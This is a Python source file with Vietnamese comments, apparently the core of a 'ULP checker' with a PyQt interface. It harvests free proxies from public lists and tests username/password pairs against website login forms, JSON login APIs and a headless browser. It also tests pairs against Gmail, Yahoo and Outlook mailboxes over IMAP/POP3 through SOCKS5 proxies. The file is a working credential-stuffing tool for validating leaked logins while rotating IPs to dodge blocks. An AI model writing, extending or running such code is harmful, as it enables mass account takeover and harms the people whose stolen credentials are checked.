# core/ulp_checker.py - Bản Full Fix: Tích hợp SOCKS5 cho Mail, Sửa lỗi POP3, Tối ưu Proxy
import re
import time
import socket
import imaplib
import poplib
import requests
import concurrent.futures
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

import socks # Thư viện PySocks

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from PyQt5.QtCore import QThread, pyqtSignal

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

# ==================== PROXY SCANNER ====================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
]
PROXY_RE = re.compile(r"^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$")

def _proxy_dict(proxy):
    if not proxy: return None
    p = proxy if proxy.startswith("http") or proxy.startswith("socks") else "http://" + proxy
    return {"http": p, "https": p}

def fetch_raw_proxies(limit=3000):
    result = set()
    headers = {"User-Agent": "Mozilla/5.0"}
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=15, headers=headers, verify=False)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    s = line.strip()
                    if PROXY_RE.match(s):
                        if "socks5" in url:
                            s = "socks5://" + s
                        result.add(s)
                        if len(result) >= limit: return list(result)
        except: continue
    return list(result)

def _ping_proxy(proxy, endpoint, timeout=6):
    try:
        t0 = time.time()
        r = requests.get(endpoint, proxies=_proxy_dict(proxy), timeout=timeout, verify=False, allow_redirects=False)
        if r.status_code in (200, 301, 302, 401, 403, 404):
            return (proxy, time.time() - t0)
    except: pass
    return None

def mine_proxies(endpoint, need, max_workers=150):
    raw = fetch_raw_proxies()
    if not raw: return []
    live = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = [ex.submit(_ping_proxy, p, endpoint) for p in raw]
        for f in concurrent.futures.as_completed(futs):
            res = f.result()
            if res:
                live.append(res)
                if len(live) >= need * 2: break
    live.sort(key=lambda x: x[1])
    return [p for p, _ in live[:need]]
class ProxyMinerWorker(QThread):
    log_signal = pyqtSignal(str)
    done_signal = pyqtSignal(list)

    def __init__(self, endpoint, need):
        super().__init__()
        self.endpoint = endpoint
        self.need = need

    def run(self):
        self.log_signal.emit(f"[*] Đang đào proxy cho {self.endpoint} (cần ~{self.need})...")
        proxies = mine_proxies(self.endpoint, self.need)
        self.done_signal.emit(proxies)

# ==================== LOGIC WEB LOGIN ====================
def _session(proxy=None):
    s = requests.Session()
    s.headers.update(HEADERS)
    pd = _proxy_dict(proxy)
    if pd: s.proxies = pd
    return s

def create_driver(proxy=None):
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--log-level=3")
    options.add_argument("--blink-settings=imagesEnabled=false")
    if proxy and proxy.startswith("http"):
        options.add_argument(f'--proxy-server={proxy}')
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

def check_web_selenium(domain_url, user, pwd, proxy=None):
    driver = None
    try:
        driver = create_driver(proxy)
        driver.set_page_load_timeout(20)
        try:
            driver.get(domain_url)
        except TimeoutException:
            return False, "Proxy chậm/Timeout load trang"

        time.sleep(2)
        user_input, pass_input, login_btn = None, None, None
        
        for xpath in ["//input[@type='text' and contains(@placeholder, 'Tên')]", "//input[@name='username']", "//input[@id='username']", "//input[@type='text']"]:
            try:
                user_input = WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.XPATH, xpath)))
                break
            except: continue
        try: pass_input = driver.find_element(By.XPATH, "//input[@type='password']")
        except: pass
        for xpath in ["//button[contains(text(), 'Đăng Nhập') or contains(text(), 'Đăng nhập') or contains(text(), 'LOGIN')]", "//button[@type='submit']", "//input[@type='submit']"]:
            try:
                login_btn = driver.find_element(By.XPATH, xpath)
                break
            except: continue

        if not user_input or not pass_input or not login_btn: 
            return False, "Không tìm thấy form (Selenium)"
            
        user_input.clear(); user_input.send_keys(user)
        pass_input.clear(); pass_input.send_keys(pwd)
        login_btn.click()
        time.sleep(3)
        
        page_source = driver.page_source.lower()
        if "sai mật khẩu" in page_source or "sai tên" in page_source or "không tồn tại" in page_source: 
            return False, "Sai tài khoản"
        if domain_url not in driver.current_url: 
            return True, "Chuyển hướng thành công"
        
        try:
            driver.find_element(By.XPATH, "//input[@type='password']")
            return False, "Vẫn còn form login"
        except: 
            return True, "Form login biến mất"
            
    except WebDriverException as e:
        return False, f"Lỗi WebDriver/Proxy: {str(e)[:30]}"
    except Exception as e: 
        return False, f"Lỗi Selenium: {str(e)[:30]}"
    finally:
        if driver: driver.quit()

def check_web_auto(domain_url, user, pwd, proxy=None):
    try:
        s = _session(proxy)
        try:
            r0 = s.get(domain_url, timeout=15, verify=False)
        except requests.exceptions.ProxyError:
            return False, "Proxy chết/Không kết nối được"
        except requests.exceptions.ConnectTimeout:
            return False, "Timeout kết nối (Proxy chậm)"
        except Exception as e:
            return False, f"Lỗi mạng: {str(e)[:30]}"
            
        if r0.status_code == 403:
            return False, "Bị chặn IP (HTTP 403)"
        if r0.status_code != 200: 
            return False, f"HTTP {r0.status_code}"
            
        soup = BeautifulSoup(r0.text, "html.parser")
        form = None
        for f in soup.find_all("form"):
            if f.find("input", {"type": "password"}):
                form = f; break
        if form:
            action = form.get("action", "")
            method = form.get("method", "post").lower()
            post_url = domain_url.rstrip("/") + "/" + action.lstrip("/") if action else domain_url
            u_field, p_field = "username", "password"
            payload = {}
            for inp in form.find_all("input"):
                name = inp.get("name")
                if not name: continue
                if inp.get("type") == "password": p_field = name
                elif inp.get("type") in ("text", "email"): u_field = name
                elif inp.get("type") == "hidden": payload[name] = inp.get("value", "")
            payload[u_field] = user; payload[p_field] = pwd
            try:
                r1 = s.post(post_url, data=payload, timeout=15, verify=False, allow_redirects=True) if method == "post" else s.get(post_url, params=payload, timeout=15, verify=False, allow_redirects=True)
                if "login" not in r1.url.lower() and "error" not in r1.url.lower():
                    if any(k in r1.text.lower() for k in ["logout", "profile", "dashboard", "welcome"]): 
                        return True, "HTML Form"
                return False, "HTML Form thất bại"
            except:
                return False, "Lỗi POST Form"
                
        for ep in ["/api/login", "/api/v1/login", "/auth/login", "/login"]:
            try:
                h = dict(HEADERS); h["Content-Type"] = "application/json"
                r = s.post(domain_url.rstrip("/") + ep, json={"username": user, "password": pwd}, headers=h, timeout=10, verify=False)
                if r.status_code == 200:
                    try:
                        obj = r.json()
                        if obj.get("token") or obj.get("access_token") or obj.get("code") in (0, 200): 
                            return True, "API JSON"
                    except: pass
            except: pass
            
        return check_web_selenium(domain_url, user, pwd, proxy)
    except Exception as e: 
        return False, f"Lỗi Auto: {str(e)[:30]}"

# ==================== LOGIC MAIL ACCESS (HỖ TRỢ SOCKS5) ====================
def check_mail_imap(user, pwd, proxy=None):
    """Hàm check IMAP / POP3 với hỗ trợ SOCKS5 Proxy"""
    domain = user.split("@")[-1].lower()
    
    if "hotmail" in domain or "outlook" in domain or "live" in domain: 
        server_imap, server_pop = "outlook.office365.com", "outlook.office365.com"
    elif "yahoo" in domain: 
        server_imap, server_pop = "imap.mail.yahoo.com", "pop.mail.yahoo.com"
    elif "gmail" in domain: 
        server_imap, server_pop = "imap.gmail.com", "pop.gmail.com"
    else: 
        return False, "Không hỗ trợ domain mail này"

    original_socket = socket.socket
    
    # Cấu hình SOCKS5 nếu có proxy
    if proxy and proxy.startswith("socks5://"):
        try:
            proxy_str = proxy.replace("socks5://", "")
            ip, port = proxy_str.split(":")
            socks.set_default_proxy(socks.SOCKS5, ip, int(port))
            socket.socket = socks.socksocket
        except Exception:
            return False, "Lỗi cấu hình SOCKS5"

    try:
        # --- 1. THỬ IMAP ---
        try:
            mail = imaplib.IMAP4_SSL(server_imap, timeout=15)
            mail.login(user, pwd)
            status, response = mail.select("inbox")
            if status == "OK":
                count = int(response[0])
                mail.logout()
                return True, f"Live | {count} thư (IMAP)"
            mail.logout()
        except imaplib.IMAP4.error:
            pass # Sai pass -> Thử POP3
        except Exception:
            pass # Lỗi mạng -> Thử POP3
            
        # --- 2. THỬ POP3 ---
        try:
            pop = poplib.POP3_SSL(server_pop, timeout=15)
            pop.user(user)
            pop.pass_(pwd)
            num_messages = len(pop.list()[1])
            pop.quit()
            return True, f"Live | {num_messages} thư (POP3)"
        except poplib.error_proto:
            return False, "Sai tài khoản (POP3)"
        except Exception as e:
            return False, f"Lỗi kết nối POP3: {str(e)[:30]}"
            
    finally:
        socket.socket = original_socket # Khôi phục socket mặc định